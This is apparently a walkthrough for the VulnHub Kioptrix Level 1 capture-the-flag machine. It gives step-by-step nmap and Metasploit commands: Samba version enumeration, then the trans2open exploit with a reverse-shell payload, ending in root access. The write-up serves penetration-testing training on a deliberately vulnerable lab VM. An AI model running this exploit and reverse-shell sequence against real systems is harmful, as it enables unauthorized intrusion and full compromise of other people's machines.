# Description
Kioptrix Level 1 is a beginner-level Capture The Flag (CTF) virtual machine from VulnHub, designed to teach penetration testing and ethical hacking skills. This walkthrough will guide you through the process of exploiting the machine to gain root access.  

![Screenshot 2025-02-28 211116](https://github.com/user-attachments/assets/23a41570-7a7a-43b6-befc-21fcbd5651b4)

#  Scanning  
```nmap -sV -A -sC -p- [ Target IP ]```  

![Screenshot From 2025-02-27 12-27-50](https://github.com/user-attachments/assets/f0a02c5b-6835-463b-b633-25c81dfff3bb)  

# Service Enumeration  
Exploit Port 139/tcp  

Open metasploit  
```msfconsole```  

Search for Samba Version  
msf6 > ``` search smb_version```  

```use auxiliary/scanner/smb/smb_version```


![Screenshot From 2025-02-27 12-12-03](https://github.com/user-attachments/assets/65205d94-616c-4dee-8542-c8d440572f84)  

```show option```  

![Screenshot From 2025-02-27 12-16-48](https://github.com/user-attachments/assets/e8725956-d251-4f92-87b1-6c0826cfd41f)  

``` set RHOSTS [ Target IP ] ```  
``` run ``` or ``` exploit ```    

![Screenshot From 2025-02-27 12-17-19](https://github.com/user-attachments/assets/19d8a3e7-7398-491e-acce-061bf35f42f3)  

**samba version is 2.2.1a**

# Exploitation  

Open Metasploit ``` msfconsole ```  
``` use exploit/linux/samba/trans2open```  
```show options```  
``` set RHOSTS [ Target IP ] ```  
``` set payload generic/shell_reverse_tcp```  

``` set LHOST [ Your IP ] ```  
``` exploit ``` or ``` run ```  

![Screenshot From 2025-02-27 12-27-16](https://github.com/user-attachments/assets/71b5cc3d-26a3-41b6-b647-97309183ed53)  


![Screenshot From 2025-02-27 12-27-29](https://github.com/user-attachments/assets/ce720073-ad7e-49ba-9b8c-6962592baeda)  

#  

**Whoop whoop!!! You have ROOT access.**  
#  












